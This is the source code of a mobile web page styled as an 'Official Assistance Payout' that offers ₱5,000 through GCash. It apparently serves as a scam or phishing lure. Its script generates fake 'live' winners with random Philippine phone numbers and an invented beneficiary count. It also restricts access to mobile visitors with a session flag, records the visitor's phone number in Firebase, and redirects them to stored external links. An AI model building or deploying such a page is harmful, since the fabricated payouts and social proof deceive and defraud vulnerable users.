<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>FreeShoppingPH | Official Assistance Payout</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    
    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;800&family=Quicksand:wght@500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --nature-green: #2d6a4f;
            --emerald: #40916c;
            --white-glass: rgba(255, 255, 255, 0.95);
            --text-dark: #1b4332;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body { 
            font-family: 'Public Sans', sans-serif; 
            background: linear-gradient(135deg, #e9f5f0 0%, #d8f3dc 100%); 
            min-height: 100vh;
            display: flex; justify-content: center; align-items: center; padding: 20px;
        }

        .card {
            background: var(--white-glass);
            width: 100%; max-width: 400px; padding: 25px;
            border-radius: 30px; box-shadow: 0 15px 35px rgba(0,0,0,0.1);
            text-align: center;
        }

        .logo-img { width: 180px; margin-bottom: 15px; border-radius: 12px; }
        .amount { font-family: 'Quicksand', sans-serif; font-size: 42px; font-weight: 700; color: var(--nature-green); margin-bottom: 20px; }
        
        .pay-button { 
            background: linear-gradient(135deg, #52b788 0%, #2d6a4f 100%); 
            color: white; width: 100%; padding: 18px; border: none; border-radius: 15px; 
            font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.3s;
        }
        .pay-button:disabled { background: #94a3b8; cursor: not-allowed; opacity: 0.7; }

        .promo-photo { width: 100%; border-radius: 15px; margin-top: 15px; }

        /* WINNERS AREA */
        .winners-container {
            margin-top: 20px; text-align: left; background: #f8fdfb;
            padding: 15px; border-radius: 20px; border: 1px solid #e0f2ea;
        }
        .winners-container h3 { font-size: 12px; color: #40916c; text-transform: uppercase; text-align: center; margin-bottom: 12px; }
        
        .winner-item {
            background: white; padding: 10px; border-radius: 10px;
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 8px; border: 1px solid #eee;
            animation: popIn 0.5s ease forwards;
        }
        @keyframes popIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
        
        .gcash-icon { width: 20px; height: 20px; }
        .payout-green { color: #2d6a4f; font-weight: 800; }

        /* BENEFICIARY FOOTER */
        .beneficiary-footer {
            margin-top: 12px;
            text-align: center;
            font-size: 11px;
            font-weight: 700;
            color: var(--emerald);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .live-dot {
            height: 6px; width: 6px; background-color: #ff0000;
            border-radius: 50%; display: inline-block;
            margin-right: 5px; animation: blink 1s infinite;
        }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
    </style>
</head>
<body>

<div class="card">
    <img src="https://freeshoppingph.github.io/FreeShoppingPH/fs_cover.jpg" class="logo-img">
    <h1>Available Assistance</h1>
    <div class="amount" id="balanceText">₱5,000.00</div>

    <button class="pay-button" id="claimBtn" onclick="processClaim()">CLAIM THRU GCASH</button>

    <img src="https://freeshoppingph.github.io/FreeShoppingPH/fs_pp.jpg" class="promo-photo">

    <div class="winners-container">
        <h3>🔴 Live Success Stories</h3>
        <div id="winners-list"></div>
        <div class="beneficiary-footer">
            <span class="live-dot"></span>
            <span id="b-count">--</span> Beneficiaries Today
        </div>
    </div>
</div>

<script src="js/config.js"></script>

<script>
    // 1. INITIALIZE FIREBASE
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // 2. SECURITY CHECK
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    if (!isMobile || sessionStorage.getItem('verified_user') !== 'true') {
        window.location.href = "index.html"; 
    }

    // 3. CLAIM LOGIC
    function processClaim() {
        const btn = document.getElementById('claimBtn');
        const userPhone = sessionStorage.getItem('user_phone') || "Unknown";

        btn.disabled = true;
        btn.innerText = "VERIFYING SLOT...";

        db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value')
        .then((snapshot) => {
            if (snapshot.exists()) {
                let linkId = '';
                let linkData = null;
                snapshot.forEach(child => {
                    linkId = child.key;
                    linkData = child.val();
                });

                db.ref('links/' + linkId).update({
                    status: 'pending',
                    claimedBy: userPhone,
                    timestamp: firebase.database.ServerValue.TIMESTAMP
                }).then(() => {
                    btn.innerText = "REDIRECTING...";
                    setTimeout(() => {
                        window.location.href = linkData.url;
                    }, 1000);
                });

            } else {
                alert("All slots are currently busy. Please refresh or wait for a few minutes.");
                btn.disabled = false;
                btn.innerText = "CLAIM THRU GCASH";
            }
        })
        .catch(err => {
            console.error("Error:", err);
            btn.disabled = false;
            btn.innerText = "CLAIM THRU GCASH";
        });
    }

    // 4. WINNERS & BENEFICIARY LIMIT LOGIC
    // Simulan sa random number between 15 and 25
    let currentCount = Math.floor(Math.random() * (25 - 15 + 1)) + 15;
    const prefixes = ['0912', '0915', '0916', '0917', '0927', '0935', '0945', '0955', '0966'];
    
    function updateBeneficiaries() {
        const countDisplay = document.getElementById('b-count');
        const list = document.getElementById('winners-list');
        
        // I-update ang text display
        countDisplay.innerText = currentCount;

        // Kung wala pang 26, magdagdag pa
        if (currentCount < 26) {
            const pref = prefixes[Math.floor(Math.random() * prefixes.length)];
            const suffix = Math.floor(1000 + Math.random() * 8999);

            const item = document.createElement('div');
            item.className = 'winner-item';
            item.innerHTML = `
                <div style="display:flex; align-items:center; gap:10px;">
                    <img src="https://freeshoppingph.github.io/FreeShoppingPH/gc_icon.png" class="gcash-icon">
                    <span style="font-size:14px; font-weight:600;">${pref}***${suffix}</span>
                </div>
                <span class="payout-green">+₱5,000</span>
            `;

            list.prepend(item);
            if (list.children.length > 5) list.removeChild(list.lastChild);

            // Dagdagan ang count para sa susunod na loop
            currentCount++;
        } else {
            // Kapag 26 na, hihinto na ang pag-increment
            console.log("Limit reached: 26 beneficiaries.");
        }
    }

    document.addEventListener("DOMContentLoaded", () => {
        // Initial call
        updateBeneficiaries();
        // Loop every 3 seconds
        setInterval(updateBeneficiaries, 3000); 
    });
</script>

</body>
</html>
